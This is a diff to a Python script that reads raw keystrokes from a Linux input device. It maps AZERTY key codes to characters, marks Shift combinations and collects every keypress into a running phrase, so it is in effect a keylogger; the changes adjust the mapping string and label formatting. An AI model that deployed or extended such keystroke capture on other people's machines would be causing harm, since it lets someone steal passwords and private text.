@@ -13,7 +13,7 @@ try:
 except:
 	userKeyboardDevice = '/dev/input/event0'
 
-keys = "X^&é'(-è_çàXXXXazertyuiopXXXXqsdfghjklmXXXXwxcvbn,;:!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+keys = "X^&é'(-è_çàXazertyuiopXXXXqsdfghjklmXXXXwxcvbn,;:!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 #B=alt
 
 dev = InputDevice(userKeyboardDevice)
@@ -89,7 +89,7 @@ try:
 				touche=" ["+ks+"] ";
 
 			if ( touchecode_previous == 42 ) or ( touchecode_previous == 54):
-				touche=" [MAJ"+touche+"] ";
+				touche=" [MAJ "+touche+"] ";
 
 		        print( '\n[+] CODE TOUCHE:'+ touchecode +' => TOUCHE: "'+touche+'"(ASCII:'+touchecodeascii+') '+str(touchecode_previous)+''), #<'+str(ks)+'>
 			fullphrase=fullphrase+touche+""
